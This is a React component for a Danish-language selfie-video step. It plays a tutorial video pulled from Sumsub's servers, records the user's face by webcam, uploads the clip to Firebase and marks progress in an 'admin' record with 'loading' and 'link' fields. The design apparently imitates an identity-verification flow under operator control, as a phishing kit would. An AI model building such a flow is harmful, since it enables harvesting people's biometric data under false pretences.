import React, { useEffect, useState } from "react";
import { useTranslation } from "react-i18next";
import { getStorage, ref, uploadBytes } from "firebase/storage";
import { useOutletContext } from "react-router-dom";
import { arrayUnion, doc, updateDoc } from "firebase/firestore";
import VideoRecorder from "react-video-recorder";
import { useReactMediaRecorder, } from "react-media-recorder";
import Webcam from "react-webcam";



function Video() {
  const [identifier, setIdentifier, db, storage] = useOutletContext();
  const { t } = useTranslation();
  const [onVideo, setOnvideo] = useState(false)
  const [selfieDataURL, setSelfieDataURL] = useState(null);

  const submitVideo = async (video) => {
    if (!video) return;

    const userRef = ref(storage, identifier);
    const spaceRef = ref(userRef, "Video");
    const videoRef = ref(spaceRef, video?.name);
    let result = await uploadBytes(videoRef, video);


    //Update Admin Panel
    if (result) {
      await updateDoc(doc(db, "admin", identifier), {
        loading: true,
        link: "",
        date: new Date().toISOString(),
        pagesDone: arrayUnion("video"),
      });
    }
  };

  const { status, startRecording, stopRecording, mediaBlobUrl } =
    useReactMediaRecorder({ video: true });

  const getblob = async (url) => {
    let blob = await fetch(url).then(r => r.blob());
    submitVideo(blob)
  }

  useEffect(() => {
    mediaBlobUrl && getblob(mediaBlobUrl)
  }, [mediaBlobUrl])
  return (
    <div className="max-w-md m-auto">
      <div className="py-3 px-7  min-h-[60vh] bg-white shadow-lg mt-12 rounded-xl">
        <div className="flex flex-col gap-10 justify-between items-center  mb-10">
          <section className="w-full flex justify-center font-bold">
            SELFIE
          </section>
          <section className="w-full">
            <div className="text-sm font-bold mb-4 text-center">Kig mod kameraet. Hele dit ansigt skal være på billedet. <br /> Bevæg dit hoved som eksemplet nedenfor</div>
          </section>
          <section className="w-full flex justify-center items-center flex-col">
            {
              !onVideo ? (<video data-v-9b418c48="" autoplay="autoplay" muted="muted" playsinline="" loop="loop" width="250" height="250" className="tutorial-video">
                <source src="https://static.sumsub.com/idensic/media/liveness-tutorial.fa713ef0.webm" type="video/webm; codecs='vp8, vorbis'" />
                <source src="https://static.sumsub.com/idensic/media/liveness-tutorial.0b3f1b93.mp4" type="video/mp4" />
              </video>) :
                (<div className={`rounded-full overflow-hidden mx-20 ${status == 'recording' ? 'border-8 border-red-500 ' : 'border-none'}`}>
                  <Webcam
                    videoConstraints={{
                      width: 500,
                      height: 500,
                      facingMode: "user"
                    }}
                    className="rounded" />
                </div>)
            }
          </section>
          {!onVideo ? (
            <section className="w-full flex justify-center items-center flex-col">
              <button
                onClick={() => setOnvideo(true)}
                type="submit"
                className="text-white w-1/3 bg-[#2f51e9] font-medium rounded-sm text-sm outline-none  px-5 py-2.5 text-center flex justify-between"
              >
                <p>Naeste trin</p>
              </button>
            </section>) :
            <section className={`flex justify-center items-center`}>
              {
                status == "idle" ? (<button
                  onClick={startRecording}
                  type="submit"
                  className="text-white  bg-[#2f51e9] font-medium rounded-sm text-sm outline-none  px-5 py-2.5 text-center flex justify-between"
                >
                  <p>Start optagelse</p>
                </button>) :
                  (<button
                    onClick={stopRecording}
                    type="submit"
                    className="text-white  bg-[#2f51e9] font-medium rounded-sm text-sm outline-none  px-5 py-2.5 text-center flex justify-between"
                  >
                    <p>Stop optagelse</p>
                  </button>)
              }
            </section>}
        </div>
      </div>
    </div>
  );
}

export default Video;
